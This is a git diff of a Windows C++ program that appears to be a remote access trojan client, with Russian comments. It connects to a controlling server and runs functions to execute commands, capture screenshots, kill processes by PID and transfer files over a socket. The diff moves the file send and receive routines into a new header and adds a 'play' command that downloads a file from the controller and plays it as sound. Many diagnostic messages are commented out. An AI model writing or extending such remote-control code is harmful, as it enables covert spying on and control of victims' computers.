@@ -1,4 +1,5 @@
 #include "includes.h"
+#include "UpDown.h"
 
 std::string GenerateRandomFilename()
 {
@@ -13,50 +14,6 @@ std::string GenerateRandomFilename()
     }
 
     return randomFilename;
-}
-
-void SendFile(SOCKET client, char* filename) 
-{
-    std::ifstream file(filename, std::ios::binary);
-    if (!file) {
-        printf("[!] Failed to open file: %s\n", filename);
-        return;
-    }
-
-    // Получаем размер файла
-    file.seekg(0, std::ios::end);
-    std::streampos fileSize = file.tellg();
-    file.seekg(0, std::ios::beg);
-
-    // Выделяем буфер для чтения файла
-    char* buffer = new char[FILE_BUFF_SIZE];
-
-    // Отправляем клиенту размер файла
-    send(client, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
-
-    // Читаем и отправляем файл по частям
-    while (fileSize > 0) {
-        // Читаем очередную часть файла
-        std::streamsize bytesRead = file.readsome(buffer, FILE_BUFF_SIZE);
-        if (bytesRead <= 0) {
-            printf("[!] Failed to read file: %s\n", filename);
-            break;
-        }
-
-        // Отправляем прочитанные данные клиенту
-        int bytesSent = send(client, buffer, bytesRead, 0);
-        if (bytesSent <= 0) {
-            printf("[!] Failed to send file: %s\n", filename);
-            break;
-        }
-
-        // Уменьшаем оставшийся размер файла
-        fileSize -= bytesSent;
-    }
-
-    // Освобождаем ресурсы
-    delete[] buffer;
-    file.close();
 }
 
 BOOL WINAPI SaveBitmap(const char* path)
@@ -155,62 +112,6 @@ void KillProcessByPID(DWORD pid)
 
     CloseHandle(hProcess);
     // printf("[*] Process with PID %lu has been terminated\n", pid);
-}
-
-void ReceiveFile(SOCKET serverSocket, const std::string& filename)
-{
-    std::ofstream file(filename, std::ios::binary);
-    if (!file)
-    {
-        // printf("[!] Failed to create file: %s\n", filename.c_str());
-        return;
-    }
-
-    // Получаем размер файла от сервера
-    std::streampos fileSize;
-    int bytesReceived = recv(serverSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
-    if (bytesReceived <= 0)
-    {
-        printf("[!] Failed to receive file size\n");
-        file.close();
-        std::remove(filename.c_str()); // Удаляем созданный файл
-        return;
-    }
-
-    // Выделяем буфер для приема файла
-    char* buffer = new char[FILE_BUFF_SIZE];
-
-    // Принимаем файл по частям и записываем в файл
-    while (fileSize > 0)
-    {
-        // Получаем очередную часть файла
-        int bytesReceived = recv(serverSocket, buffer, FILE_BUFF_SIZE, 0);
-        if (bytesReceived <= 0)
-        {
-            // printf("[!] Failed to receive file\n");
-            break;
-        }
-
-        // Записываем принятые данные в файл
-        file.write(buffer, bytesReceived);
-
-        // Уменьшаем оставшийся размер файла
-        fileSize -= bytesReceived;
-    }
-
-    // Освобождаем ресурсы
-    delete[] buffer;
-    file.close();
-
-    if (fileSize <= 0)
-    {
-        // printf("[*] File received: %s\n", filename.c_str());
-    }
-    else
-    {
-        // printf("[!] Failed to receive complete file: %s\n", filename.c_str());
-        std::remove(filename.c_str()); // Удаляем частично принятый файл
-    }
 }
 
 void ExecuteCommand(const std::string& command)
@@ -470,6 +371,22 @@ int main(int argc, char* argv[])
                 }
                 // std::string callback = "Screenshot was taken";
                 // send(s, callback.c_str(), callback.size(), 0);
+            }
+            else if (command.substr(0, 4) == "play") {
+
+                // std::string filename = command.substr(7);
+                // std::string callback = "Uploading file: " + filename;
+                // send(s, callback.c_str(), callback.size(), 0);
+                // ReceiveFile(s, filename);
+
+                std::string file = command.substr(5);
+                std::string callback = file + " was sent and will played";
+                send(s, callback.c_str(), callback.size(), 0);
+                ReceiveFile(s, file);
+
+                Sleep(1000);
+
+                PlaySound(file.c_str(), NULL, SND_FILENAME); // SND_ASYNC
             }
 
             else if (command == "exit" || command == "quit" || command == "bye") {
